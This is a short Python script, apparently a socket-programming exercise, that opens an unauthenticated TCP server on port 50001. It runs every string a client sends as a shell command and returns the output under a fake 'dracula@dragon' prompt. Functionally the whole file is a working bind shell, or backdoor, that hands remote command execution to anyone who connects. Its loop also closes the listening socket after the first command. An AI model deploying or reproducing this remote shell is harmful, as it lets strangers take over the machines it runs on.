import socket as sock
import subprocess as sub
host = ''
port = 50001
s = sock.socket(sock.AF_INET, sock.SOCK_STREAM)
s.bind((host, port))
s.listen(10)
print('Waiting for connection...')
conn, addr = s.accept()
print('{} Connected by : {} '.format(addr[0],addr[1]))
while True:
    data = conn.recv(1024)
    if not data:
        break
    else:
        data = data.decode()
        data = data.strip()
        print("echo : > {} ".format(data))
        if(data == "quit"):
            print('Connection closed by client')
            break
        else:
            proc = sub.Popen(data, shell=True, stdout=sub.PIPE, stderr=sub.PIPE)
            out, err = proc.communicate()
            data = out.decode()
            data = data+"\rdracula@dragon:~$ "
            conn.sendall("{}".format(data).encode())
            
    s.close()
    
    '''
    0.must be required to run the server like hostname and port number
    1.socket established
    2.bind
    3.listen
    4.accept the connection
    5.assign the buffer for receive data    
    6.if data print it
    7.else connection break   
    '''